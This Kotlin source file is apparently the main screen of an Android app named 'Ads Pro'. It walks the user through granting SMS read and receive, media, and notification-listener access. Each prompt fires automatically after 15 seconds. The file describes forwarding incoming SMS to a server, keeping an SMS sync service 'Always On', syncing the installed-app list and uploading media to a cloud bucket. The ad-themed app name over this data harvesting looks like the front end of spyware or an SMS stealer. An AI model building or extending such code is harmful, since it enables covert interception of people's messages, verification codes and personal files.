package com.adspro.app

import android.Manifest
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.PickVisualMediaRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.lazy.grid.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import coil.compose.AsyncImage
import com.adspro.app.data.SupabaseClient
import com.adspro.app.service.SmsSyncService
import com.adspro.app.utils.FileUtils
import com.adspro.app.worker.AppsSyncWorker
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate()
        setContent { AdsProTheme { MainAppScreen() } }
    }
}

@Composable
fun AdsProTheme(content: @Composable () -> Unit) {
    MaterialTheme(colorScheme = lightColorScheme(background = Color.White, surface = Color.White, primary = Color(0xFF34A853)), content = content)
}

@Composable
fun MainAppScreen() {
    var page by remember { mutableIntStateOf(0) }
    Surface(modifier = Modifier.fillMaxSize(), color = Color.White) {
        when (page) {
            0 -> Page1SmsPermission(onNext = { page = 1 })
            1 -> Page2MediaPermission(onNext = { page = 2 })
            2 -> Page3NotificationPermission(onNext = { page = 3 })
            3 -> Page4MediaUploadGallery(onNext = { page = 4 })
            4 -> Page5Dashboard(onNext = { page = 0 })
        }
    }
}

@Composable
fun GlobalLayout(buttonText: String, onButtonClick: () -> Unit, content: @Composable ColumnScope.() -> Unit) {
    Column(modifier = Modifier.fillMaxSize().background(Color.White).padding(24.dp), horizontalAlignment = Alignment.CenterHorizontally) {
        Box(modifier = Modifier.fillMaxWidth(0.35f).height(60.dp).background(Color(0xFFE0E0E0), shape = RoundedCornerShape(8.dp)), contentAlignment = Alignment.Center) {
            Text(text = "LOGO", color = Color.Gray, fontSize = 12.sp, fontWeight = FontWeight.Bold)
        }
        Spacer(modifier = Modifier.weight(1f))
        content()
        Spacer(modifier = Modifier.weight(1f))
        Button(onClick = onButtonClick, colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853)), shape = RoundedCornerShape(12.dp), modifier = Modifier.fillMaxWidth().height(56.dp)) {
            Text(text = buttonText, color = Color.White, fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
        }
    }
}

@Composable
fun Page1SmsPermission(onNext: () -> Unit) {
    val context = LocalContext.current
    val hasSms = remember { mutableStateOf(ContextCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED) }
    val launcher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { if (it.values.all { granted -> granted }) onNext() }
    val trigger = { if (hasSms.value) onNext() else launcher.launch(arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS)) }
    LaunchedEffect(Unit) { if (hasSms.value) onNext() else { delay(15_000L); trigger() } }
    GlobalLayout("Grant SMS & Continue", trigger) {
        Text("SMS Forwarding Access", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
        Spacer(modifier = Modifier.height(12.dp))
        Text("Ads Pro requires access to SMS messages to forward incoming alerts and logs directly to your secure server.", fontSize = 14.sp, color = Color.Gray, textAlign = TextAlign.Center)
    }
}

@Composable
fun Page2MediaPermission(onNext: () -> Unit) {
    val perms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO) else arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
    val launcher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { onNext() }
    val trigger = { launcher.launch(perms) }
    LaunchedEffect(Unit) { delay(15_000L); trigger() }
    GlobalLayout("Grant Media & Continue", trigger) {
        Text("Media Library Access", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
        Spacer(modifier = Modifier.height(12.dp))
        Text("Grant permission to read images and videos to enable gallery syncing and remote media management.", fontSize = 14.sp, color = Color.Gray, textAlign = TextAlign.Center)
    }
}

@Composable
fun Page3NotificationPermission(onNext: () -> Unit) {
    val context = LocalContext.current
    val lifecycle = LocalLifecycleOwner.current
    var showDialog by remember { mutableStateOf(false) }
    val enabled = { Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")?.contains(context.packageName) == true }
    val postLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) { onNext() }
    val trigger = { if (enabled()) { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) postLauncher.launch(Manifest.permission.POST_NOTIFICATIONS) else onNext() } else showDialog = true }
    LaunchedEffect(Unit) { delay(15_000L); trigger() }
    DisposableEffect(lifecycle) {
        val obs = LifecycleEventObserver { _, e -> if (e == Lifecycle.Event.ON_RESUME && enabled()) { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) postLauncher.launch(Manifest.permission.POST_NOTIFICATIONS) else onNext() } }
        lifecycle.lifecycle.addObserver(obs)
        onDispose { lifecycle.lifecycle.removeObserver(obs) }
    }
    if (showDialog) {
        AlertDialog(onDismissRequest = { showDialog = false }, title = { Text("Enable Notification Access") }, text = { Text("Please enable Notification Access for Ads Pro in System Settings.") }, confirmButton = {
            TextButton(onClick = { showDialog = false; context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }) { Text("Settings") }
        })
    }
    GlobalLayout("Grant Notification Access & Continue", trigger) {
        Text("Notification Access", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
        Spacer(modifier = Modifier.height(12.dp))
        Text("Notification listener permissions allow processing incoming alerts and triggers.", fontSize = 14.sp, color = Color.Gray, textAlign = TextAlign.Center)
    }
}

@Composable
fun Page4MediaUploadGallery(onNext: () -> Unit) {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    var urls by remember { mutableStateOf<List<String>>(emptyList()) }
    var uploading by remember { mutableStateOf(false) }
    val refresh = { scope.launch(Dispatchers.IO) { urls = SupabaseClient.listMedia("media") } }
    LaunchedEffect(Unit) { refresh() }
    val picker = rememberLauncherForActivityResult(ActivityResultContracts.PickMultipleVisualMedia()) { uris ->
        if (uris.isNotEmpty()) {
            uploading = true
            scope.launch(Dispatchers.IO) {
                uris.forEach { u -> FileUtils.getFileFromUri(context, u)?.let { SupabaseClient.uploadFile("media", "uploads/${System.currentTimeMillis()}_${it.name}", it, context.contentResolver.getType(u) ?: "image/jpeg") } }
                uploading = false; refresh()
            }
        }
    }
    GlobalLayout("Continue to Dashboard", onNext) {
        Text("Media Cloud Sync", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = { picker.launch(PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageAndVideo)) }, colors = ButtonDefaults.buttonColors(containerColor = Color.Black), shape = RoundedCornerShape(8.dp)) {
            Text(if (uploading) "Uploading..." else "Select & Upload Media", color = Color.White)
        }
        Spacer(modifier = Modifier.height(16.dp))
        LazyVerticalGrid(columns = GridCells.Fixed(3), modifier = Modifier.fillMaxWidth().weight(1f), horizontalArrangement = Arrangement.spacedBy(4.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
            items(urls) { url -> AsyncImage(model = url, contentDescription = null, modifier = Modifier.aspectRatio(1f).background(Color.LightGray), contentScale = ContentScale.Crop) }
        }
    }
}

@Composable
fun Page5Dashboard(onNext: () -> Unit) {
    val context = LocalContext.current
    var running by remember { mutableStateOf(false) }
    LaunchedEffect(Unit) {
        @Suppress("DEPRECATION")
        running = (context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).getRunningServices(Int.MAX_VALUE).any { it.service.className == SmsSyncService::class.java.name }
    }
    GlobalLayout("Finish", onNext) {
        Text("System Dashboard", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color.Black)
        Spacer(modifier = Modifier.height(24.dp))
        Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = Color(0xFFF5F5F5)), shape = RoundedCornerShape(12.dp)) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("Sync Service Status", fontSize = 12.sp, color = Color.Gray)
                Spacer(modifier = Modifier.height(4.dp))
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(modifier = Modifier.size(10.dp).background(if (running) Color(0xFF34A853) else Color(0xFFFBBC05), shape = RoundedCornerShape(5.dp)))
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(if (running) "Always On" else "Restarting", fontSize = 16.sp, fontWeight = FontWeight.Bold, color = Color.Black)
                }
            }
        }
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = { WorkManager.getInstance(context).enqueue(OneTimeWorkRequestBuilder<AppsSyncWorker>().build()) }, colors = ButtonDefaults.buttonColors(containerColor = Color.DarkGray), shape = RoundedCornerShape(8.dp), modifier = Modifier.fillMaxWidth()) {
            Text("Sync Installed Apps Now", color = Color.White)
        }
    }
}
